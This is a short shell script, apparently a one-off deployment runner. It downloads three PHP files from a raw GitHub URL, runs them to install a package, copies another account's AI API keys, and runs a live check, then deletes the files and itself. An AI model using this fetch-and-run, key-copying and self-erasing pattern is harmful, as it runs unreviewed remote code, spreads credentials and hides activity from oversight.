#!/bin/sh
# One-off runner: install the package (key in $1), copy Dar's AI keys (read-only on Dar), then a live check. Removes itself.
cd "$HOME" || exit 1
B=https://raw.githubusercontent.com/a04032417-svg/Dar101/jaww; P=/opt/alt/php83/usr/bin/php
for f in d c l; do curl -fsSL -o "$f.php" "$B/$f.php" || exit 1; done
echo "== install"; $P d.php "$1"; echo "== keys"; $P c.php; echo "== live check"; $P l.php
rm -f d.php c.php l.php r.sh
